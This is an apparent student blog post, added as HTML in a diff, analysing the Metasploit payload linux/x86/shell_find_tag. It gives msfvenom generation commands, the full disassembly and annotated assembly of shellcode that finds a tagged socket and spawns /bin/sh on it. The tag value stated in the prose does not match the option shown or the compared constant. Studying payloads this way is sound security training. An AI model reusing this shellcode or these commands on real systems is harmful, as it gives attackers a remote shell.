@@ -1,0 +1,358 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
+<head>
+<meta charset="utf-8">
+<title>SLAE Assignment 5 (2/3) &#8211; rtmcx</title>
+<meta name="description" content="SLAE Assignment 5 - Dissecting Msfvenom Payloads (Linux/x86)">
+<meta name="keywords" content="asm, code, slae">
+
+
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SLAE Assignment 5 (2/3)">
+<meta property="og:description" content="SLAE Assignment 5 - Dissecting Msfvenom Payloads (Linux/x86)">
+<meta property="og:url" content="https://rtmcx.github.io/SLAE-Assignment-5_2/">
+<meta property="og:site_name" content="rtmcx">
+
+
+
+
+
+<link rel="canonical" href="https://rtmcx.github.io/SLAE-Assignment-5_2/">
+<link href="https://rtmcx.github.io/feed.xml" type="application/atom+xml" rel="alternate" title="rtmcx Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="https://rtmcx.github.io/assets/css/main.css">
+<!-- Webfonts -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+<!-- Load Modernizr -->
+<script src="https://rtmcx.github.io/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="https://rtmcx.github.io/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="https://rtmcx.github.io/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="https://rtmcx.github.io/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://rtmcx.github.io/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://rtmcx.github.io/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://rtmcx.github.io/images/apple-touch-icon-144x144-precomposed.png">
+
+
+
+</head>
+
+<body id="post" class="feature">
+
+<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
+	<button class="dl-trigger">Open Menu</button>
+	<ul class="dl-menu">
+		<li><a href="https://rtmcx.github.io/">Home</a></li>
+		<li>
+			<a href="#">About</a>
+			<ul class="dl-submenu">
+				<li>
+					<img src="https://rtmcx.github.io/images/CatEye.jpg" alt="rtmcx photo" class="author-photo">
+					<h4>rtmcx</h4>
+					<p>Pentester. OSCP. Aspiring shellcoder and malware analyst</p>
+				</li>
+				<li><a href="https://rtmcx.github.io/about/"><span class="btn btn-inverse">Learn More</span></a></li>
+				<li>
+					<a href="mailto:rtmcx@protonmail.com"><i class="fa fa-fw fa-envelope"></i> Email</a>
+				</li>
+				
+				
+				
+				
+				
+				
+				
+				
+				
+			</ul><!-- /.dl-submenu -->
+		</li>
+		<li>
+			<a href="#">Posts</a>
+			<ul class="dl-submenu">
+				<li><a href="https://rtmcx.github.io/posts/">All Posts</a></li>
+				<li><a href="https://rtmcx.github.io/tags/">All Tags</a></li>
+			</ul>
+		</li>
+		
+	    
+	    <li><a href="http://www.twitter.com/rtmcx" target="_blank">Twitter</a></li>
+	  
+	</ul><!-- /.dl-menu -->
+</nav><!-- /.dl-menuwrapper -->
+
+
+
+<div class="entry-header">
+  
+  <div class="entry-image">
+    <img src="https://rtmcx.github.io/images/assignment-1.jpg" alt="SLAE Assignment 5 (2/3)">
+  </div><!-- /.entry-image -->
+</div><!-- /.entry-header -->
+
+
+<div id="main" role="main">
+  <article class="hentry">
+    <header class="header-title">
+      <div class="header-title-wrap">
+        
+          <h1 class="entry-title"><a href="https://rtmcx.github.io/SLAE-Assignment-5_2/" rel="bookmark" title="SLAE Assignment 5 (2/3)">SLAE Assignment 5 (2/3)</a></h1>
+        
+        <h2><span class="entry-date date published"><time datetime="2017-05-05T00:00:00+00:00">May 05, 2017</time></span></h2>
+        
+        <p class="entry-reading-time">
+          <i class="fa fa-clock-o"></i>
+          
+Reading time ~3 minutes
+        </p><!-- /.entry-reading-time -->
+        
+      </div><!-- /.header-title-wrap -->
+    </header>
+    <div class="entry-content">
+      <h1 id="dissecting-msfvenom-payloads-linuxx86">Dissecting Msfvenom Payloads (Linux/x86)</h1>
+
+<h2 id="requirements">Requirements</h2>
+
+<ul>
+  <li>Take up at least 3 shellcode samples created using msfvenom  for linux/x86</li>
+  <li>Use GDB/Ndisasm/Libemu to dissect the
+funcSonality of the shellcode</li>
+  <li>Present your analysis</li>
+</ul>
+
+<h2 id="linuxx86shell_find_tag">linux/x86/shell_find_tag</h2>
+<p>The second payload we analyse is “linux/x86/shell_find_tag”.</p>
+
+<p>Lets see if we can get a hint of what the payload does..</p>
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code>;rtmcx@parrot <span class="nv">$ </span>msfvenom -p linux/x86/shell_find_tag --payload-options
+Options <span class="k">for </span>payload/linux/x86/shell_find_tag:
+
+
+       Name: Linux Command Shell, Find Tag Inline
+     Module: payload/linux/x86/shell_find_tag
+   Platform: Linux
+       Arch: x86
+Needs Admin: No
+ Total size: 69
+       Rank: Normal
+
+Provided by:
+    skape &lt;mmiller@hick.org&gt;
+
+Description:
+  Spawn a shell on an established connection <span class="o">(</span>proxy/nat safe<span class="o">)</span>
+
+
+Advanced options <span class="k">for </span>payload/linux/x86/shell_find_tag:
+...
+    TAG                   1zsD             yes       The four byte tag to signify the connection.
+</code></pre>
+</div>
+<p>Not much information there, lets generate the payload and feed it to “libemu:s” sctest:</p>
+
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>msfvenom -p linux/x86/shell_find_tag R | sctest -vvv -Ss 10000 
+</code></pre>
+</div>
+<p>We get a lot of output, but no psudocode was generated. 
+Lets generate a ‘dot’-file that we can get a image from, and convert it to a png-file by using (the program) ‘dot’.</p>
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>msfvenom -p linux/x86/shell_find_tag R | sctest -vvv -Ss 10000 
+-G shell_find_tag.dot
+graph file s.dot
+verbose <span class="o">=</span> 3
+
+rtmcx@parrot <span class="nv">$ </span>dot -Tpng shell_find_tag.dot -o shell_find_tag.png
+</code></pre>
+</div>
+
+<p><img src="/images/shell_find_tag.png" /></p>
+
+<p>Ok, we get some information, but far from a complete analysis. Gets use ndisasm to extract the instructions.</p>
+
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>msfvenom -p linux/x86/shell_find_tag R | ndisasm -u -
+
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 69 bytes
+
+00000000  31DB              xor ebx,ebx
+00000002  53                push ebx
+00000003  89E6              mov esi,esp
+00000005  6A40              push byte +0x40
+00000007  B70A              mov bh,0xa
+00000009  53                push ebx
+0000000A  56                push esi
+0000000B  53                push ebx
+0000000C  89E1              mov ecx,esp
+0000000E  86FB              xchg bh,bl
+00000010  66FF01            inc word <span class="o">[</span>ecx]
+00000013  6A66              push byte +0x66
+00000015  58                pop eax
+00000016  CD80              int 0x80
+00000018  813E78563373      cmp dword <span class="o">[</span>esi],0x73335678
+0000001E  75F0              jnz 0x10
+00000020  5F                pop edi
+00000021  89FB              mov ebx,edi
+00000023  6A02              push byte +0x2
+00000025  59                pop ecx
+00000026  6A3F              push byte +0x3f
+00000028  58                pop eax
+00000029  CD80              int 0x80
+0000002B  49                dec ecx
+0000002C  79F8              jns 0x26
+0000002E  6A0B              push byte +0xb
+00000030  58                pop eax
+00000031  99                cdq
+00000032  52                push edx
+00000033  682F2F7368        push dword 0x68732f2f
+00000038  682F62696E        push dword 0x6e69622f
+0000003D  89E3              mov ebx,esp
+0000003F  52                push edx
+00000040  53                push ebx
+00000041  89E1              mov ecx,esp
+00000043  CD80              int 0x80
+</code></pre>
+</div>
+
+<p>Well, the code never lies, eh?</p>
+
+<p>Now we go through the instructions and comment the code for clarity.</p>
+
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; Set up syscall for socketcall 0xA (recv)</span>
+<span class="c">; recv(int sockfd, void *buf, size_t len, int flags);</span>
+<span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span><span class="n">ebx</span> 
+<span class="k">push</span> <span class="n">ebx</span>   		  <span class="c">; Flags-args</span>
+<span class="k">mov</span> <span class="n">esi</span><span class="p">,</span><span class="n">esp</span>       
+<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x40</span>	  <span class="c">; 64 bytes	      </span>
+<span class="k">mov</span> <span class="n">bh</span><span class="p">,</span><span class="mh">0xa</span>        <span class="c">; Socketcall 10 = RECV</span>
+<span class="k">push</span> <span class="n">ebx</span> 		  
+<span class="k">push</span> <span class="n">esi</span>
+<span class="k">push</span> <span class="n">ebx</span>
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>
+<span class="k">xchg</span> <span class="n">bh</span><span class="p">,</span><span class="n">bl</span>
+
+<span class="c">; compare-loop: </span>
+<span class="k">inc</span> <span class="n">word</span> <span class="p">[ecx]</span>      <span class="c">; Next connection</span>
+<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x66</span>     <span class="c">; Syscall socketcall</span>
+<span class="k">pop</span> <span class="n">eax</span>             <span class="c">; to eax</span>
+<span class="k">int</span> <span class="mh">0x80</span>
+<span class="k">cmp</span> <span class="n">dword</span> <span class="p">[esi],</span><span class="mh">0x73335678</span>  <span class="c">; Did we get our markerbytes?</span>
+<span class="k">jnz</span> <span class="mh">0x10</span>            <span class="c">; No, retry. Loop compare-loop </span>
+
+<span class="c">; Here we have found the TAG</span>
+<span class="c">; Execute dup2()</span>
+<span class="k">pop</span> <span class="n">edi</span>                <span class="c">; Get sockfd      </span>
+<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">edi</span>           <span class="c">; Save in ebx</span>
+<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x2</span>        <span class="c">; Store 2</span>
+<span class="k">pop</span> <span class="n">ecx</span>               <span class="c">; in ecx (counter)</span>
+
+<span class="c">; dup2-loop:</span>
+<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x3f</span>       <span class="c">; push 63 (syscall for dup2)</span>
+<span class="k">pop</span> <span class="n">eax</span>               <span class="c">; into eax</span>
+<span class="k">int</span> <span class="mh">0x80</span>              <span class="c">; Syscall </span>
+<span class="k">dec</span> <span class="n">ecx</span>               <span class="c">; From 2 to 0 (stdin, stdout and stderr..</span>
+<span class="k">jns</span> <span class="mh">0x26</span>              <span class="c">; not zero yet, loop 'dup2-loop'</span>
+
+<span class="c">; Execve</span>
+<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0xb</span>        <span class="c">; Put 11 in </span>
+<span class="k">pop</span> <span class="n">eax</span>               <span class="c">; eax (syscall for execve)</span>
+<span class="k">cdq</span> 
+<span class="k">push</span> <span class="n">edx</span>              <span class="c">; Push "/bin//sh0"</span>
+<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x68732f2f</span> <span class="c">; to stack</span>
+<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x6e69622f</span> <span class="c">; </span>
+<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">esp</span>           <span class="c">; and set pointer to string</span>
+<span class="k">push</span> <span class="n">edx</span>              <span class="c">; NULLL</span>
+<span class="k">push</span> <span class="n">ebx</span>              <span class="c">; Pointer to array</span>
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>           <span class="c">; in ecx</span>
+<span class="k">int</span> <span class="mh">0x80</span>              <span class="c">; Execute syscall</span>
+</code></pre>
+</div>
+<p>So the payload searches through all open connections (sockfd:s) looking for the specified ‘TAG’-value (in our case ‘b37x’). When the TAG is found, a shell is spawned on the connection (after the file descriptors have been duplicated with ‘dup2’).</p>
+
+<p>All code and scripts can be found in the repository: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>
+
+<hr />
+
+<p>This blog post has been created for completing the requirements of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert certification</a>.</p>
+
+<p>Student ID: PA-0726</p>
+
+      <footer class="entry-meta">
+        <span class="entry-tags"><a href="https://rtmcx.github.io/tags/#asm" title="Pages tagged asm" class="tag"><span class="term">asm</span></a><a href="https://rtmcx.github.io/tags/#code" title="Pages tagged code" class="tag"><span class="term">code</span></a><a href="https://rtmcx.github.io/tags/#slae" title="Pages tagged slae" class="tag"><span class="term">slae</span></a></span>
+        <span>Updated on <span class="entry-date date updated"><time datetime="2017-05-05 21:09:20 +0000">May 05, 2017</time></span></span>
+        <span class="author vcard"><span class="fn">rtmcx</span></span>
+        <div class="social-share">
+  <ul class="socialcount socialcount-small inline-list">
+    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=https://rtmcx.github.io/SLAE-Assignment-5_2/" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
+    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=https://rtmcx.github.io/SLAE-Assignment-5_2/" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
+    <li class="googleplus"><a href="https://plus.google.com/share?url=https://rtmcx.github.io/SLAE-Assignment-5_2/" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
+  </ul>
+</div><!-- /.social-share -->
+      </footer>
+    </div><!-- /.entry-content -->
+    
+    <div class="read-more">
+  
+    <div class="read-more-header">
+      <a href="https://rtmcx.github.io/SLAE-Assignment-5/" class="read-more-btn">Read More</a>
+    </div><!-- /.read-more-header -->
+    <div class="read-more-content">
+      <h3><a href="https://rtmcx.github.io/SLAE-Assignment-7/" title="SLAE Assignment 7">SLAE Assignment 7</a></h3>
+      <p>SLAE Assignment 7 - Custom crypter <a href="https://rtmcx.github.io/SLAE-Assignment-7/">Continue reading</a></p>
+    </div><!-- /.read-more-content -->
+  
+  <div class="read-more-list">
+    
+      <div class="list-item">
+        <h4><a href="https://rtmcx.github.io/SLAE-Assignment-6/" title="SLAE Assignment 6">SLAE Assignment 6</a></h4>
+        <span>Published on May 09, 2017</span>
+      </div><!-- /.list-item -->
+    
+      <div class="list-item">
+        <h4><a href="https://rtmcx.github.io/SLAE-Assignment-5_3/" title="SLAE Assignment 5 (3/3)">SLAE Assignment 5 (3/3)</a></h4>
+        <span>Published on May 06, 2017</span>
+      </div><!-- /.list-item -->
+    
+  </div><!-- /.read-more-list -->
+</div><!-- /.read-more -->
+  </article>
+</div><!-- /#main -->
+
+<div class="footer-wrapper">
+  <footer role="contentinfo">
+    <span>&copy; 2017 rtmcx. Powered by <a href="http://jekyllrb.com" rel="nofollow">Jekyll</a> using the <a href="https://mademistakes.com/work/hpstr-jekyll-theme/" rel="nofollow">HPSTR Theme</a>.</span>
+  </footer>
+</div><!-- /.footer-wrapper -->
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>window.jQuery || document.write('<script src="https://rtmcx.github.io/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script src="https://rtmcx.github.io/assets/js/scripts.min.js"></script>
+
+
+
+	        
+
+</body>
+</html>
